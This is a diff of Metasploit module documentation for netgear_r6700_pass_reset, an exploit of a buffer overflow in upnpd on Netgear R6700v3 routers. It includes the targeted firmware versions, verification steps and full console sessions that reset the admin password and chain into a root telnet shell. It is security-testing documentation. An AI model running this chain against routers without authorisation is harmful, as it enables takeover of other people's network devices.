@@ -1,7 +1,7 @@
-## Description
+## Vulnerable Application
 
-This module exploits a buffer overflow vulnerability in the upnpd daemon (/usr/sbin/upnpd), running on the 
-router Netgear R6700v3, ARM Architecture, firmware version V1.0.4.82_10.0.57 and V1.0.4.84_10.0.58 to reset the password 
+This module exploits a buffer overflow vulnerability in the upnpd daemon (/usr/sbin/upnpd), running on the
+router Netgear R6700v3, ARM Architecture, firmware version V1.0.4.82_10.0.57 and V1.0.4.84_10.0.58 to reset the password
 of the "admin" user on affected systems back to its factory default of "password". Support for other versions has not
 been added due to time constraints; users are encouraged to refer to the advisory for details on how to update the
 offset to the admin password reset functionality to support other firmware versions.
@@ -12,7 +12,7 @@ will crash the upnpd daemon and it will not restart, so attackers can only explo
 of the router. After using this module, to achieve code execution, do the following steps manually:
 
 1. Login to 192.168.1.1 with creds 'admin:password', then:
-    * go to Advanced -> Administration -> Set Password
+    * Go to Advanced -> Administration -> Set Password
  	* Change the password from 'password' to <WHATEVER>
 2. Run metasploit as root, then:
  	* use exploit/linux/telnet/netgear_telnetenable
@@ -25,13 +25,11 @@ of the router. After using this module, to achieve code execution, do the follow
 
 This vulnerability was discovered and exploited at Pwn2Own Tokyo 2019 by the team Flashback (Pedro Ribeiro + Radek Domanski).
 
-## Vulnerable Application
-
+Vulnerable firmware versions can be downloaded using the following links:
 * [Netgear R6700v3 firmware version V1.0.4.82_10.0.57](http://www.downloads.netgear.com/files/GDC/R6700v3/R6700v3-V1.0.4.82_10.0.57.zip)
 * [Netgear R6700v3 firmware version V1.0.4.84_10.0.58](http://www.downloads.netgear.com/files/GDC/R6700v3/R6700v3-V1.0.4.84_10.0.58.zip)
 
 ## Verification Steps
-  Example steps in this format:
 
   1. Connect the R6700v3 router to your local area network and ensure you can access it.
   2. Browse to the admin portal for the router, which will be located by default at `http://192.168.1.1`.
@@ -43,7 +41,7 @@ This vulnerability was discovered and exploited at Pwn2Own Tokyo 2019 by the tea
   8. Set RHOST
   9. Run ```check``` and verify that the target is vulnerable.
   10. Do: ```run```
-  11. Browse admin portal for the router, and 
+  11. Browse admin portal for the router, and
   verify you can successfully log in with the username `admin` and the password `password`.
 
 ## Options
@@ -52,7 +50,7 @@ This vulnerability was discovered and exploited at Pwn2Own Tokyo 2019 by the tea
 
 IP address of the LAN interface of the vulnerable target.
 
-### RPORT 
+### RPORT
 
 upnpd port on the target. Default 5000.
 
@@ -61,110 +59,216 @@ upnpd port on the target. Default 5000.
 ### Netgear R6700v3 firmware version V1.0.4.84_10.0.58
 
 ```
-msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > set RHOST 192.168.1.1
-RHOST => 192.168.1.1
-msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > check 
+    msf5 > use auxiliary/admin/http/netgear_r6700_pass_reset
+    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > show options
+    
+    Module options (auxiliary/admin/http/netgear_r6700_pass_reset):
+    
+       Name     Current Setting  Required  Description
+       ----     ---------------  --------  -----------
+       Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+       RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+       RPORT    5000             yes       The target port (TCP)
+       SSL      false            no        Negotiate SSL/TLS for outgoing connections
+       VHOST                     no        HTTP server virtual host
+    
+    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > set RHOSTS 192.168.1.1
+    RHOSTS => 192.168.1.1
+    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > check
+    
+    [*] Target is running firmware version 1.0.4.84
+    [*] 192.168.1.1:5000 - The target appears to be vulnerable.
+    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > exploit
+    [*] Running module against 192.168.1.1
+    
+    [*] 192.168.1.1:5000 - Identified Netgear R6700v3 (firmware V1.0.0.4.84_10.0.58) as the target.
+    [+] 192.168.1.1:5000 - HTTP payload sent! 'admin' password has been reset to 'password'
+    [*] To achieve code execution, do the following steps manually:
+    [*] 1- Login to 192.168.1.1 with creds 'admin:password', then:
+    [*]     1.1- go to Advanced -> Administration -> Set Password
+    [*]     1.2- Change the password from 'password' to <WHATEVER>
+    [*] 2- Run metasploit as root, then:
+    [*]     2.1- use exploit/linux/telnet/netgear_telnetenable
+    [*]     2.2- set interface <INTERFACE_CONNECTED_TO_ROUTER>
+    [*]     2.3- set rhost 192.168.1.1
+    [*]     2.3- set username admin
+    [*]     2.4- set password <WHATEVER>
+    [*]     2.5- OPTIONAL: set timeout 1500
+    [*]     2.6- OPTIONAL: set MAC <ROUTERS_MAC>
+    [*]     2.7- run it and login with 'admin:<WHATEVER>'
+    [*] 3- Enjoy your root shell!
+    [*] Auxiliary module execution completed
+    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) >
+```
 
-[*] 192.168.1.1:5000 - Identified Netgear R6700v3 (firmware V1.0.0.4.84_10.0.58) as the target.
-[+] 192.168.1.1:5000 - The target is vulnerable.
+Browsed to admin page and changed password to `testing123`, then in a new `msfconsole`
+session running as `root`, entered the following commands:
 
-msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > run
-[*] Running module against 192.168.1.1
-
-[*] 192.168.1.1:5000 - Identified Netgear R6700v3 (firmware V1.0.0.4.84_10.0.58) as the target.
-[+] 192.168.1.1:5000 - HTTP payload sent! 'admin' password has been reset to 'password'
-[*] To achieve code execution, do the following steps manually:
-[*] 1- Login to 192.168.1.1 with creds 'admin:password', then:
-[*] 	1.1- go to Advanced -> Administration -> Set Password
-[*] 	1.2- Change the password from 'password' to <WHATEVER>
-[*] 2- Run metasploit as root, then:
-[*] 	2.1- use exploit/linux/telnet/netgear_telnetenable
-[*] 	2.2- set interface <INTERFACE_CONNECTED_TO_ROUTER>
-[*] 	2.3- set rhost 192.168.1.1
-[*] 	2.3- set username admin
-[*] 	2.4- set password <WHATEVER>
-[*] 	2.5- run it and login with 'admin:<WHATEVER>'
-[*] 3- Enjoy your root shell!
-[*] Auxiliary module execution completed
-msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > use exploit/linux/telnet/netgear_telnetenable
-msf5 exploit(linux/telnet/netgear_telnetenable) > ifconfig | grep enx
-[*] exec: ifconfig | grep enx
-
-enxd03745775fdd: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-msf5 exploit(linux/telnet/netgear_telnetenable) > set interface enxd03745775fdd
-interface => enxd03745775fdd
-msf5 exploit(linux/telnet/netgear_telnetenable) > set rhost 192.168.1.1
-rhost => 192.168.1.1
-msf5 exploit(linux/telnet/netgear_telnetenable) > set username admin
-username => admin
-msf5 exploit(linux/telnet/netgear_telnetenable) > set password Flashback
-password => Flashback
-msf5 exploit(linux/telnet/netgear_telnetenable) > set timeout 1500
-timeout => 1500
-msf5 exploit(linux/telnet/netgear_telnetenable) > run
-
-[+] 192.168.1.1:23 - Detected telnetenabled on UDP
-[*] 192.168.1.1:23 - Attempting to discover MAC address via ARP
-[+] 192.168.1.1:23 - Found MAC address
-[+] 192.168.1.1:23 - Using creds admin:Flashback
-[*] 192.168.1.1:23 - Generating magic packet
-[*] 192.168.1.1:23 - Connecting to telnetenabled via UDP
-[*] 192.168.1.1:23 - Sending magic packet
-[*] 192.168.1.1:23 - Disconnecting from telnetenabled
-[*] 192.168.1.1:23 - Waiting for telnetd
-[*] 192.168.1.1:23 - Connecting to telnetd
-[*] Found shell.
-[*] Command shell session 1 opened (0.0.0.0:0 -> 192.168.1.1:23) at 2020-06-22 17:52:25 +0200
-
- login: admin
-admin
-Password: Flashback
-
-
-
-BusyBox v1.7.2 (2019-10-19 12:12:12 CST) built-in shell (ash)
-Enter 'help' for a list of built-in commands.
-
-# id
-id
-uid=0(admin) gid=0(root)
-# uname -a
-uname -a
-Linux R6700v3 2.6.36.4brcmarm+ #17 SMP PREEMPT Sat Oct 19 11:17:27 CST 2019 armv7l unknown
-
+```
+    msf5 > use exploit/linux/telnet/netgear_telnetenable
+    [*] No payload configured, defaulting to cmd/unix/interact
+    msf5 exploit(linux/telnet/netgear_telnetenable) > set username admin
+    username => admin
+    msf5 exploit(linux/telnet/netgear_telnetenable) > set password testing123
+    password => testing123
+    msf5 exploit(linux/telnet/netgear_telnetenable) > set MAC D56C89FC94C9
+    MAC => D56C89FC94C9
+    msf5 exploit(linux/telnet/netgear_telnetenable) > set RHOSTS 192.168.1.1
+    RHOSTS => 192.168.1.1
+    msf5 exploit(linux/telnet/netgear_telnetenable) > exploit
+    
+    [+] 192.168.1.1:23 - Detected telnetenabled on UDP
+    [+] 192.168.1.1:23 - Using creds admin:testing123
+    [*] 192.168.1.1:23 - Generating magic packet
+    [*] 192.168.1.1:23 - Connecting to telnetenabled via UDP
+    [*] 192.168.1.1:23 - Sending magic packet
+    [*] 192.168.1.1:23 - Disconnecting from telnetenabled
+    [*] 192.168.1.1:23 - Waiting for telnetd
+    [*] 192.168.1.1:23 - Connecting to telnetd
+    [*] Found shell.
+    [*] Command shell session 1 opened (0.0.0.0:0 -> 192.168.1.1:23) at 2020-06-30 15:57:33 -0500
+    
+    
+    
+    Login incorrect
+     login: admin
+    admin
+    Password: testing123
+    
+    
+    
+    BusyBox v1.7.2 (2019-10-19 12:12:12 CST) built-in shell (ash)
+    Enter 'help' for a list of built-in commands.
+    
+    # id
+    id
+    uid=0(admin) gid=0(root)
+    # uname -a
+    uname -a
+    Linux R6700v3 2.6.36.4brcmarm+ #17 SMP PREEMPT Sat Oct 19 11:17:27 CST 2019 armv7l unknown
+    #
 ```
 
 ### Netgear R6700v3 firmware version V1.0.0.4.82_10.0.57
 
 ```
-msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > show options
+    msf5 > use auxiliary/admin/http/netgear_r6700_pass_reset
+    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > show options
+    
+    Module options (auxiliary/admin/http/netgear_r6700_pass_reset):
+    
+       Name     Current Setting  Required  Description
+       ----     ---------------  --------  -----------
+       Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+       RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+       RPORT    5000             yes       The target port (TCP)
+       SSL      false            no        Negotiate SSL/TLS for outgoing connections
+       VHOST                     no        HTTP server virtual host
+    
+    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > set RHOSTS 192.168.1.1
+    RHOSTS => 192.168.1.1
+    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > check
+    
+    [*] Target is running firmware version 1.0.4.82
+    [*] 192.168.1.1:5000 - The target appears to be vulnerable.
+    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > exploit
+    [*] Running module against 192.168.1.1
+    
+    [*] 192.168.1.1:5000 - Identified Netgear R6700v3 (firmware V1.0.0.4.82_10.0.57) as the target.
+    [+] 192.168.1.1:5000 - HTTP payload sent! 'admin' password has been reset to 'password'
+    [*] To achieve code execution, do the following steps manually:
+    [*] 1- Login to 192.168.1.1 with creds 'admin:password', then:
+    [*]     1.1- go to Advanced -> Administration -> Set Password
+    [*]     1.2- Change the password from 'password' to <WHATEVER>
+    [*] 2- Run metasploit as root, then:
+    [*]     2.1- use exploit/linux/telnet/netgear_telnetenable
+    [*]     2.2- set interface <INTERFACE_CONNECTED_TO_ROUTER>
+    [*]     2.3- set rhost 192.168.1.1
+    [*]     2.3- set username admin
+    [*]     2.4- set password <WHATEVER>
+    [*]     2.5- OPTIONAL: set timeout 1500
+    [*]     2.6- OPTIONAL: set MAC <ROUTERS_MAC>
+    [*]     2.7- run it and login with 'admin:<WHATEVER>'
+    [*] 3- Enjoy your root shell!
+    [*] Auxiliary module execution completed
+    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) >
+```
 
-Module options (auxiliary/admin/http/netgear_r6700_pass_reset):
+Browsed to admin page and changed password to `testing123`, then in a new `msfconsole`
+session running as `root`, entered the following commands:
 
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS   192.168.1.1      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
-   RPORT    5000             yes       The target port (TCP)
-   SSL      false            no        Negotiate SSL/TLS for outgoing connections
-   VHOST                     no        HTTP server virtual host
-
-msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > exploit
-[*] Running module against 192.168.1.1
-
-[*] 192.168.1.1:5000 - Identified Netgear R6700v3 (firmware V1.0.0.4.82_10.0.57) as the target.
-[+] 192.168.1.1:5000 - HTTP payload sent! 'admin' password has been reset to 'password'
-[*] To achieve code execution, do the following steps manually:
-[*] 1- Login to 192.168.1.1 with creds 'admin:password', then:
-[*]     1.1- go to Advanced -> Administration -> Set Password
-[*]     1.2- Change the password from 'password' to <WHATEVER>
-[*] 2- Run metasploit as root, then:
-[*]     2.1- use exploit/linux/telnet/netgear_telnetenable
-[*]     2.2- set interface <INTERFACE_CONNECTED_TO_ROUTER>
-[*]     2.3- set rhost 192.168.1.1
-[*]     2.3- set username admin
-[*]     2.4- set password <WHATEVER>
-[*]     2.5- run it and login with 'admin:<WHATEVER>'
-[*] 3- Enjoy your root shell!
-[*] Auxiliary module execution completed
+```
+    msf5 > use exploit/linux/telnet/netgear_telnetenable
+    [*] No payload configured, defaulting to cmd/unix/interact
+    msf5 exploit(linux/telnet/netgear_telnetenable) > show options
+    
+    Module options (exploit/linux/telnet/netgear_telnetenable):
+    
+       Name       Current Setting  Required  Description
+       ----       ---------------  --------  -----------
+       FILTER                      no        The filter string for capturing traffic
+       INTERFACE                   no        The name of the interface
+       MAC                         no        MAC address of device
+       PASSWORD                    no        Password on device
+       PCAPFILE                    no        The name of the PCAP capture file to process
+       RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+       RPORT      23               yes       The target port (TCP)
+       SNAPLEN    65535            yes       The number of bytes to capture
+       TIMEOUT    500              yes       The number of seconds to wait for new data
+       USERNAME                    no        Username on device
+    
+    
+    Payload options (cmd/unix/interact):
+    
+       Name  Current Setting  Required  Description
+       ----  ---------------  --------  -----------
+    
+    
+    Exploit target:
+    
+       Id  Name
+       --  ----
+       0   Automatic (detect TCP or UDP)
+    
+    
+    msf5 exploit(linux/telnet/netgear_telnetenable) > set RHOST 192.168.1.1
+    RHOST => 192.168.1.1
+    set msf5 exploit(linux/telnet/netgear_telnetenable) > set username admin
+    username => admin
+    msf5 exploit(linux/telnet/netgear_telnetenable) > set password testing123
+    password => testing123
+    msf5 exploit(linux/telnet/netgear_telnetenable) > set MAC D56C89FC94C9
+    MAC => D56C89FC94C9
+    msf5 exploit(linux/telnet/netgear_telnetenable) > exploit
+    
+    [+] 192.168.1.1:23 - Detected telnetenabled on UDP
+    [+] 192.168.1.1:23 - Using creds admin:testing123
+    [*] 192.168.1.1:23 - Generating magic packet
+    [*] 192.168.1.1:23 - Connecting to telnetenabled via UDP
+    [*] 192.168.1.1:23 - Sending magic packet
+    [*] 192.168.1.1:23 - Disconnecting from telnetenabled
+    [*] 192.168.1.1:23 - Waiting for telnetd
+    [*] 192.168.1.1:23 - Connecting to telnetd
+    [*] Found shell.
+    [*] Command shell session 1 opened (0.0.0.0:0 -> 192.168.1.1:23) at 2020-06-30 15:14:08 -0500
+    
+    
+    
+    Login incorrect
+     login: admin
+    admin
+    Password: testing123
+    
+    
+    
+    BusyBox v1.7.2 (2019-07-29 20:56:07 CST) built-in shell (ash)
+    Enter 'help' for a list of built-in commands.
+    
+    # id
+    id
+    uid=0(admin) gid=0(root)
+    # uname -a
+    uname -a
+    Linux R6700v3 2.6.36.4brcmarm+ #17 SMP PREEMPT Mon Jul 29 19:43:55 CST 2019 armv7l unknown
+    #
 ```
